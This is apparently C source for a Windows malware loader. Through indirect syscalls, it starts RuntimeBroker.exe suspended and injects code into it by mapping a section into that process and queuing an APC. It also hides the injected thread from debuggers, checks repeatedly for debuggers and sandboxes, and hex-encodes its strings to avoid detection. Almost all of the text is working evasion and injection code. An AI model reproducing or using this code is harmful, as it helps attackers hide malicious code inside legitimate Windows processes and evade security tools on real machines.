    //HANDLE hNewThread = NULL;

    //SET_SYSCALL(sys_func.NtCreateThreadEx);
    //if ((state = RedroExec(&hNewThread, THREAD_ALL_ACCESS , NULL , hProcess , pRemoteView, NULL , THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER | THREAD_CREATE_FLAGS_CREATE_SUSPENDED, NULL , NULL , NULL , NULL )) != 0x00) {
    //    //myprintf("create thotho failed : 0x%X \n" , state);
    //    return FALSE;
    //}
    //myprintf("created thotho with hand 0x%p \n" , hNewThread);
    SharedSleep(2 * 1000);
    SET_SYSCALL(sys_func.NtQueueApcThread);
    state = RedroExec(hThread, pRemoteView, NULL, NULL, NULL);
    if (state != 0x00) {
        //myprintf("failed to queue : 0x%X \n" , state);
        return FALSE;
    }

    SharedSleep(2 * 1000);
    myprintf("queue thr done\n");
    SET_SYSCALL(sys_func.NtSetInformationThread);
    state = RedroExec(hThread, 0x11 , NULL , NULL);
    if (state != 0x00) {
        myprintf("setinfo failed : 0x%X\n" , state);
        return FALSE;
    }

   
    SET_SYSCALL(sys_func.NtResumeThread);
    state = RedroExec(hThread, NULL);
    if (state != 0x00) {
        myprintf("failed resume : 0x%X \n", state);
        return FALSE;
    }
    myprintf("resume thr done\n");

    *pInjectionLocation = pRemoteView;

    SET_SYSCALL(sys_func.NtClose);
    state = RedroExec(hThread);
    SET_SYSCALL(sys_func.NtClose);
    state = RedroExec(hSection);
    SET_SYSCALL(sys_func.NtClose);
    if ((state = RedroExec(hProcess)) != 0x00) {
        myprintf("close failed : 0x%X \n", state);
    }
    myprintf("closed all hands \n");
    return TRUE;



}
// -------------------------------- //// -------------------------------- //// -------------------------------- //


wchar_t path[] = { 0x005C, 0x003F, 0x003F, 0x005C, 0x0043, 0x003A, 0x005C, 0x0057, 0x0069, 0x006E, 0x0064, 0x006F, 0x0077, 0x0073, 0x005C, 0x0053, 0x0079, 0x0073, 0x0074, 0x0065, 0x006D, 0x0033, 0x0032, 0x005C, 0x0052, 0x0075, 0x006E, 0x0074, 0x0069, 0x006D, 0x0065, 0x0042, 0x0072, 0x006F, 0x006B, 0x0065, 0x0072, 0x002E, 0x0065, 0x0078, 0x0065
};
//wchar_t path2[] = L"\\??\\C:\\Windows\\System32\\calc.exe";
wchar_t command_line[] = { 0x0043, 0x003A, 0x005C, 0x0057, 0x0069, 0x006E, 0x0064, 0x006F, 0x0077, 0x0073, 0x005C, 0x0053, 0x0079, 0x0073, 0x0074, 0x0065, 0x006D, 0x0033, 0x0032, 0x005C, 0x0052, 0x0075, 0x006E, 0x0074, 0x0069, 0x006D, 0x0065, 0x0042, 0x0072, 0x006F, 0x006B, 0x0065, 0x0072, 0x002E, 0x0065, 0x0078, 0x0065, 0x0020, 0x002D, 0x0045, 0x006D, 0x0062, 0x0065, 0x0064, 0x0064, 0x0069, 0x006E, 0x0067, 0x0020
};

wchar_t current_dir[] = { 0x0043, 0x003A, 0x005C, 0x0057, 0x0069, 0x006E, 0x0064, 0x006F, 0x0077, 0x0073, 0x005C, 0x0053, 0x0079, 0x0073, 0x0074, 0x0065, 0x006D, 0x0033, 0x0032
};

int main() {
    if (ChekDebug()) {
        //myprintf("No sandbox detected, continuing execution...\n");
        return 1;
    }
    if (ChekDebug()) {
        return -1;
    }
    //myprintf("hello there !\n ");
    InitializeNTCONFIG();

    BOOL isit =  InitSyscakk();
    if (!isit) {
        //myprintf("\nFailed to initialize bokemon \n");
    }
    PVOID sLocation = NULL;
    if (ChekDebug()) {
        //myprintf("No sandbox detected, continuing execution...\n");
        return 1;
    }
    HANDLE hProcess =NULL;
    HANDLE hThread = NULL;

    if (!CreateProcLowLevel( (PWSTR)path, (PWSTR)command_line , (PWSTR)current_dir , &hProcess , &hThread)) {
        myprintf("\nfailed to create koko \n");
        return -1;
    }
    if (!hThread) {
        myprintf("hThr is nukk \n");
        return -1;
    }

    myprintf("hthr is 0x%p \n" , hThread);

    if (ChekDebug()) {
        //myprintf("No sandbox detected, continuing execution...\n");
        return 1;
    }
    BOOL state = MapInject2(hProcess , hThread , &sLocation );
    
    // get the pid 
    // pass it to RemoteMapInject 
    // 
    // 
    // 
    // 
    // phantom operations works untill here :D:D:D 
    
    
    // getchar();

	return 0;
}
